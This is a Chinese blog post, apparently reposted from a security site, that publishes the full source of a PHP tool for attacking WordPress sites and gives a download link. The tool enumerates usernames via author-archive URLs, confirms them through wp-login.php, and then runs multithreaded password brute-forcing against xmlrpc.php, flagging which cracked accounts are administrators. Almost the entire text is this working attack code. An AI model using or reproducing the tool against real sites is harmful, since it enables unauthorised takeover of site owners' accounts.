---
title: wordpress 用户枚举，爆破工具
date: 2017-11-28 10:24:47
tags: wordpress,安全,用户,工具

---
web破解 一般喜欢用 burpsuite 、hydra 通用性好　但 一大堆参数　使用是还需配置

破解wordpress 用wpscan 不得不说是很好用 功能多 而且经常更新　　但 不是每次跑wordpress 都开linux (ruby 各种蛋疼)

1: 使用非常简单 无需其它参数

	shell>php scan.php http://www.target.com

或者是你的电脑装了php，并且配置了环境变量，就是可以在scan.php这个文件所在目录运行这段代码了。

2：多线程（异步） 同时进行

破完一个用户成功立即退出该任务 接着破另外一个用户

3：自动生成用户名相关并加到字典头部

大大的提高破解速度

4：模块可单独使用

5：枚举用户模块 能抓取大部分常规 wordpress站点用户

检查枚举到的用户是否为登陆用户 如果不是则剔除 大大的提高破解效率

6：该脚本 需curl 扩展支持

7：利用wordpress 的xmlrpc.php 文件破解

可绕过限制 并判断是否为管理员用户

8、环境简单

仅需 php.exe 、php5ts.dll 、curl.dll

文件说明：

	init.php 配置及功能函数
	enum_user.php 根据页面枚举用户
	chkuser.php 检测枚举到的用户是否为可登陆用户
	RollingCurl.php 多线程http请求类 （修改版）
	BruteWordPress.php 爆破类
	scan.php 主文件(要运行的文件)
	pass.list 高频率弱口令

init.php

	<?php
	function_exists('curl_init')? '' : die('cURL Must be installed for geturl function to work. Ask your host to enable it or uncomment extension=php_curl.dll in php.ini');
	ini_set('memory_limit', -1);
	date_default_timezone_set('PRC');
	define("wordlist",'pass.list');
	define("max_user",10);// 最大列出用户数
	define("USERAGENT",'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.2 Safari/537.36');
	define("START_TIME", func_time());
	define("Thread",10); //设置线程
	define("TimeOut",5);//设置超时时间
	define("params",$argv[0]);
	define("target",$argv[1]);
	if(target){
		$domain = trim(target);
		define("domain",$domain);
	}else{
	
		exit('php '.params.' http://192.168.0.108/wordpress/');
	}
	
	require_once 'RollingCurl.php';
	
	function func_time() {
	    list($microsec, $sec) = explode(' ', microtime());
	    return $microsec + $sec;
	}
	
	
	/***
	*  计算执行时间
	*/
	function show_time(){
		echo str_repeat(" ", 50) . PHP_EOL . 'time: ' . round((func_time() - START_TIME), 4) . ' sec ' . PHP_EOL;
	}
	?>

enum_user.php

	<?php
	class EnumUser
	{
	    
	    private $rc;
	    private $names;
	    function __construct() {
	        $this->nv = 0;
	        $this->rc = new RollingCurl();
	        $this->rc->callback = $this->create_request_callback($this->rc);
	        $this->rc->__set('window_size', Thread);
	        $this->rc->__set('time_out', TimeOut);
	    }
	    
	    function create_request_callback($rc) {
	        return function ($response, $info, $request) use ($rc) {
	            $pattern = '/(author\/(.*)\/feed|<body class="archive author author-([^\s]+))/';
	            if (preg_match($pattern, $response, $name)) {
	                $c = count($name) - 1;
	                if (!empty($name[$c])) {
	                    $this->names[] = $name[$c];
	                } else {
	                    
	                    $this->nv++;
	                }
	            }
	            if ($this->nv >= 3) {
	                
	                $this->rc->cancelRequests();
	            }
	        };
	    }
	    
	    function run() {
	        global $a;
	        printf("[+] %s Enumerating usernames ...\r\n", date('h:i:s', time()));
	        for ($i = 1; $i <= max_user; $i++) {
	            $url = domain . "/?author=" . $i;
	            $request = new RollingCurlRequest($url);
	            $request->options = array(CURLOPT_USERAGENT => USERAGENT);
	            $this->rc->add($request);
	        }
	        $this->rc->execute();
	        
	        if (count($this->names) == 0) {
	            exit('[-] Unable to find user!');
	        }
	        
	        echo "[+] Find " . count($this->names) . ' users' . PHP_EOL;
	    }
	    
	    function result() {
	        
	        return $this->names;
	    }
	}
	?>

chkuser.php

	<?php
	include 'init.php';
	class Chkuser
	{
	    
	    private $rc;
	    private $names;
	    function __construct() {
	        $this->rc = new RollingCurl();
	        $this->rc->callback = $this->create_request_callback($this->rc);
	        $this->rc->__set('window_size', Thread);
	        $this->rc->__set('time_out', TimeOut);
	    }
	    
	    function create_request_callback($rc) {
	        return function ($response, $info, $request) use ($rc) {
	            if ($info['http_code'] == 404 || $info['http_code'] == 403 || $info['http_code'] == 500) {
	                echo '[-] Access error!' . PHP_EOL;
	                $this->rc->cancelRequests();
	            }
	            preg_match('#log=(.+)&pwd=#', $request->post_data, $out);
	            $user = $out[1];
	            
	            if (stristr($response, "<strong>" . $user . "</strong>")) {
	                $this->names[] = $user;
	            }
	            if (stristr($response, 'Too many failed login attempts')) {
	                $this->rc->cancelRequests();
	            }
	        };
	    }
	    
	    function run() {
	        include_once 'enum_user.php';
	        $collector = new EnumUser();
	        $collector->run();
	        $users = $collector->result();
	        printf("[+] %s Chkusers Loginname...\r\n", date('h:i:s', time()));
	        foreach ($users as $user) {
	            $url = domain . '/wp-login.php';
	            $post_data = "log={$user}&pwd=UjP8XnFD4n3LzIjlax";
	            $request = new RollingCurlRequest($url, 'POST', $post_data);
	            $request->options = array(CURLOPT_USERAGENT => USERAGENT);
	            $this->rc->add($request);
	        }
	        $this->rc->execute();
	        $counts = count($this->names);
	        if ($counts == 0) {
	            echo '[-] Warning Unable Check Loginuser!' . PHP_EOL;
	            $this->names = $users;
	            $counts = count($this->names);
	        }
	        echo 'login users:' . PHP_EOL;
	        foreach ($this->names as $key => $u) {
	            
	            echo "\t" .iconv("UTF-8","GB18030//IGNORE",$u) . PHP_EOL;
	        }
	        printf("[+] %s Finded %d loginnames ... \r\n", date('h:i:s', time()), $counts);
	    }
	    
	    function result() {
	        
	        return $this->names;
	    }
	}
	?>

RollingCurl.php

	<?php
	
	/*
	Authored by Josh Fraser (www.joshfraser.com)
	Released under Apache License 2.0
	
	Maintained by Alexander Makarov, http://rmcreative.ru/
	
	$Id$
	*/
	
	/**
	 * Class that represent a single curl request
	 */
	class RollingCurlRequest
	{
	    public $url = false;
	    public $method = 'GET';
	    public $post_data = null;
	    public $headers = null;
	    public $options = null;
	    
	    /**
	     * @param string $url
	     * @param string $method
	     * @param  $post_data
	     * @param  $headers
	     * @param  $options
	     * @return void
	     */
	    function __construct($url, $method = "GET", $post_data = null, $headers = null, $options = null) {
	        $this->url = $url;
	        $this->method = $method;
	        $this->post_data = $post_data;
	        $this->headers = $headers;
	        $this->options = $options;
	    }
	    
	    /**
	     * @return void
	     */
	    public function __destruct() {
	        unset($this->url, $this->method, $this->post_data, $this->headers, $this->options);
	    }
	}
	
	/**
	 * RollingCurl custom exception
	 */
	class RollingCurlException extends Exception
	{
	}
	
	/**
	 * Class that holds a rolling queue of curl requests.
	 *
	 * @throws RollingCurlException
	 */
	class RollingCurl
	{
	    
	    /**
	     * @var int
	     *
	     * Window size is the max number of simultaneous connections allowed.
	     *
	     * REMEMBER TO RESPECT THE SERVERS:
	     * Sending too many requests at one time can easily be perceived
	     * as a DOS attack. Increase this window_size if you are making requests
	     * to multiple servers or have permission from the receving server admins.
	     */
	    private $window_size = 5;
	    
	    /**
	     * @var float
	     *
	     * Timeout is the timeout used for curl_multi_select.
	     */
	    private $timeout = 10;
	    
	    /**
	     * @var string|array
	     *
	     * Callback function to be applied to each result.
	     */
	    public $callback;
	    
	    public $master = null;
	    
	    public $requestList = array();
	    
	    /**
	     * @var array
	     *
	     * Set your base options that you want to be used with EVERY request.
	     */
	    protected $options = array(CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_RETURNTRANSFER => 1, CURLOPT_CONNECTTIMEOUT => 30, CURLOPT_TIMEOUT => 30);
	    
	    /**
	     * @var array
	     */
	    private $headers = array();
	    
	    /**
	     * @var Request[]
	     *
	     * The request queue
	     */
	    private $requests = array();
	    
	    /**
	     * @var RequestMap[]
	     *
	     * Maps handles to request indexes
	     */
	    private $requestMap = array();
	    
	    /**
	     * @param  $callback
	     * Callback function to be applied to each result.
	     *
	     * Can be specified as 'my_callback_function'
	     * or array($object, 'my_callback_method').
	     *
	     * Function should take three parameters: $response, $info, $request.
	     * $response is response body, $info is additional curl info.
	     * $request is the original request
	     *
	     * @return void
	     */
	    function __construct($callback = null) {
	        $this->callback = $callback;
	    }
	    
	    /**
	     * @param string $name
	     * @return mixed
	     */
	    public function __get($name) {
	        return (isset($this->{$name})) ? $this->{$name} : null;
	    }
	    
	    /**
	     * @param string $name
	     * @param mixed $value
	     * @return bool
	     */
	    public function __set($name, $value) {
	        
	        // append the base options & headers
	        if ($name == "options" || $name == "headers") {
	            $this->{$name} = $value + $this->{$name};
	        } else {
	            $this->{$name} = $value;
	        }
	        return true;
	    }
	    
	    /**
	     * Add a request to the request queue
	     *
	     * @param Request $request
	     * @return bool
	     */
	    public function add($request) {
	        $this->requests[] = $request;
	        return true;
	    }
	    
	    public function cancelRequests($all = true) {
	        $this->requests = array();
	        if ($all) {
	            foreach ($this->requestList as $handler) {
	                curl_multi_remove_handle($this->master, $handler);
	            }
	        }
	        return true;
	    }
	    
	    /**
	     * Create new Request and add it to the request queue
	     *
	     * @param string $url
	     * @param string $method
	     * @param  $post_data
	     * @param  $headers
	     * @param  $options
	     * @return bool
	     */
	    public function request($url, $method = "GET", $post_data = null, $headers = null, $options = null) {
	        $this->requests[] = new RollingCurlRequest($url, $method, $post_data, $headers, $options);
	        return true;
	    }
	    
	    /**
	     * Perform GET request
	     *
	     * @param string $url
	     * @param  $headers
	     * @param  $options
	     * @return bool
	     */
	    public function get($url, $headers = null, $options = null) {
	        return $this->request($url, "GET", null, $headers, $options);
	    }
	    
	    /**
	     * Perform POST request
	     *
	     * @param string $url
	     * @param  $post_data
	     * @param  $headers
	     * @param  $options
	     * @return bool
	     */
	    public function post($url, $post_data = null, $headers = null, $options = null) {
	        return $this->request($url, "POST", $post_data, $headers, $options);
	    }
	    
	    /**
	     * Execute processing
	     *
	     * @param int $window_size Max number of simultaneous connections
	     * @return string|bool
	     */
	    public function execute($window_size = null) {
	        
	        // rolling curl window must always be greater than 1
	        if (sizeof($this->requests) == 1) {
	            return $this->single_curl();
	        } else {
	            
	            // start the rolling curl. window_size is the max number of simultaneous connections
	            return $this->rolling_curl($window_size);
	        }
	    }
	    
	    /**
	     * Performs a single curl request
	     *
	     * @access private
	     * @return string
	     */
	    private function single_curl() {
	        $ch = curl_init();
	        $request = array_shift($this->requests);
	        $options = $this->get_options($request);
	        curl_setopt_array($ch, $options);
	        $output = curl_exec($ch);
	        $info = curl_getinfo($ch);
	        
	        // it's not neccesary to set a callback for one-off requests
	        if ($this->callback) {
	            $callback = $this->callback;
	            if (is_callable($this->callback)) {
	                call_user_func($callback, $output, $info, $request);
	            }
	        } else return $output;
	        return true;
	    }
	    
	    /**
	     * Performs multiple curl requests
	     *
	     * @access private
	     * @throws RollingCurlException
	     * @param int $window_size Max number of simultaneous connections
	     * @return bool
	     */
	    private function rolling_curl($window_size = null) {
	        if ($window_size) $this->window_size = $window_size;
	        
	        // make sure the rolling window isn't greater than the # of urls
	        if (sizeof($this->requests) < $this->window_size) $this->window_size = sizeof($this->requests);
	        
	        if ($this->window_size < 2) {
	            throw new RollingCurlException("Window size must be greater than 1");
	        }
	        
	        $this->master = curl_multi_init();
	        
	        // start the first batch of requests
	        for ($i = 0; $i < $this->window_size; $i++) {
	            $ch = curl_init();
	            
	            $options = $this->get_options($this->requests[$i]);
	            
	            curl_setopt_array($ch, $options);
	            curl_multi_add_handle($this->master, $ch);
	            array_push($this->requestList, $ch);
	            
	            // Add to our request Maps
	            $key = (string)$ch;
	            $this->requestMap[$key] = $i;
	        }
	        
	        do {
	            while (($execrun = curl_multi_exec($this->master, $running)) == CURLM_CALL_MULTI_PERFORM);
	            if ($execrun != CURLM_OK) break;
	            
	            // a request was just completed -- find out which one
	            while ($done = curl_multi_info_read($this->master)) {
	                
	                // get the info and content returned on the request
	                $info = curl_getinfo($done['handle']);
	                $output = curl_multi_getcontent($done['handle']);
	                
	                // send the return values to the callback function.
	                $callback = $this->callback;
	                if (is_callable($callback)) {
	                    $key = (string)$done['handle'];
	                    $request = $this->requests[$this->requestMap[$key]];
	                    unset($this->requestMap[$key]);
	                    call_user_func($callback, $output, $info, $request);
	                }
	                
	                // start a new request (it's important to do this before removing the old one)
	                if ($i < sizeof($this->requests) && isset($this->requests[$i]) && $i < count($this->requests)) {
	                    $ch = curl_init();
	                    $options = $this->get_options($this->requests[$i]);
	                    curl_setopt_array($ch, $options);
	                    curl_multi_add_handle($this->master, $ch);
	                    array_push($this->requestList, $ch);
	                    
	                    // Add to our request Maps
	                    $key = (string)$ch;
	                    $this->requestMap[$key] = $i;
	                    $i++;
	                }
	                
	                // remove the curl handle that just completed
	                curl_multi_remove_handle($this->master, $done['handle']);
	            }
	            
	            // Block for data in / output; error handling is done by curl_multi_exec
	            if ($running) curl_multi_select($this->master, $this->timeout);
	        }
	        while ($running);
	        curl_multi_close($this->master);
	        return true;
	    }
	    
	    /**
	     * Helper function to set up a new request by setting the appropriate options
	     *
	     * @access private
	     * @param Request $request
	     * @return array
	     */
	    private function get_options($request) {
	        
	        // options for this entire curl object
	        $options = $this->__get('options');
	        if (ini_get('safe_mode') == 'Off' || !ini_get('safe_mode')) {
	            $options[CURLOPT_FOLLOWLOCATION] = 1;
	            $options[CURLOPT_MAXREDIRS] = 5;
	        }
	        $headers = $this->__get('headers');
	        
	        // append custom options for this specific request
	        if ($request->options) {
	            $options = $request->options + $options;
	        }
	        
	        // set the request URL
	        $options[CURLOPT_URL] = $request->url;
	        
	        // posting data w/ this request?
	        if ($request->post_data) {
	            $options[CURLOPT_POST] = 1;
	            $options[CURLOPT_POSTFIELDS] = $request->post_data;
	        }
	        if ($headers) {
	            $options[CURLOPT_HEADER] = 0;
	            $options[CURLOPT_HTTPHEADER] = $headers;
	        }
	        
	        return $options;
	    }
	    
	    /**
	     * @return void
	     */
	    public function __destruct() {
	        unset($this->window_size, $this->callback, $this->options, $this->headers, $this->requests);
	    }
	}

BruteWordPress.php

	<?php
	include 'init.php';
	define("user", $argv[2]);
	class BruteWordPress
	{
	    private $rc;
	    function __construct() {
	        $this->rc = new RollingCurl();
	        $this->rc->callback = $this->create_request_callback($this->rc);
	        $this->rc->__set('window_size', Thread);
	        $this->rc->__set('time_out', TimeOut);
	    }
	    
	    function create_request_callback($rc) {
	        return function ($response, $info, $request) use ($rc) {
	            if ($info['http_code'] == 404 || $info['http_code'] == 403 || $info['http_code'] == 500) {
	                echo '[-] Access error!' . PHP_EOL;
	                $this->rc->cancelRequests();
	            }
	            
	            $p = $request->post_data;
	            preg_match_all('/<param><value>([^\s]+?)<\/value><\/param>/', $p, $m);
	            $user = $m[1][0];
	            $pass = $m[1][1];
	            if (!preg_match('/<boolean>(\d)<\/boolean>/', $response, $is_admin)) {
	                
	                //echo '[*] Brote user ' . $user . " ..." . "\r";
	                
	                
	            } else {
	                
	                //print_r($is_admin).PHP_EOL;
	                if ($is_admin[1] == 1) {
	                    echo '[+] Bruteed~ -> ' . iconv("UTF-8","GB18030//IGNORE",$user)  . ':' . $pass . ' [is admin]' . PHP_EOL;
	                    $this->rc->cancelRequests();
	                } else {
	                    echo '[+] Bruteed~ -> ' . iconv("UTF-8","GB18030//IGNORE",$user)  . ':' . $pass . PHP_EOL;
	                    $this->rc->cancelRequests();
	                }
	            }
	        };
	    }
	    
	    function run() {
	        $pass_file = preg_replace('/\s$/', "", file(wordlist));
	        $user_pre = array('123', '111', '1', 'a', 'pass', '!@#', 'password', 'abc', '1961', '1962', '1963', '1970', '1988', '1989', '1990', '1991', '1992', '1993', '1994', '1995', '1996', '1997', '1998', '1999', '2001', '2002', '2003', '2004', '2006', '2005', '2007', '2008', '2009', '2010', '2011', '2012', '2013', '2014', '2015');
	        foreach ($user_pre as $pre) {
	            $pre_u[] = user . $pre;
	        }
	        $p = array_merge($pre_u, $pass_file);
	        $passwords = array_unique($p);
	        array_unshift($passwords, user);
	        
	        foreach ($passwords as $pass) {
	            $url = domain . '/xmlrpc.php';
	            $post_data = sprintf('<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>%s</value></param><param><value>%s</value></param></params></methodCall>', user, $pass);
	            $request = new RollingCurlRequest($url, 'POST', $post_data);
	            $request->options = array(CURLOPT_USERAGENT => USERAGENT);
	            $this->rc->add($request);
	        }
	        $this->rc->execute();
	    }
	}
	
	$brute = new BruteWordPress();
	$brute->run();
	?>

scan.php

	<?php
	include 'chkuser.php';
	
	$chk = new Chkuser();
	$chk->run();
	$user_arr = $chk->result();
	
	//print_r($user_arr);
	
	function broter($user) {
	    
	    system('php BruteWordPress.php ' . target . ' ' . $user);
	}
	printf("[+] %s Broting...\r\n", date('h:i:s', time()));
	foreach ($user_arr as $user) {
	    echo '[*] Brute user ' . iconv("UTF-8","GB18030//IGNORE",$user). " ..." . str_repeat(' ', 60) . "\r";
	    broter($user);
	}
	show_time();
	?>

打包下载
----------
文章引用来自：[体验盒子 | 关注网络安全](http://www.uedbox.com/brutewordpress-scan/)，请大家支持原创

链接:[http://pan.baidu.com/s/1jIMQPq2](http://pan.baidu.com/s/1jIMQPq2) ，密码：o5q3

使用方法很简单：下载这个资源，然后在scan.php所在文件夹下运行命令：

	php scan.php http://www.targetdomain.com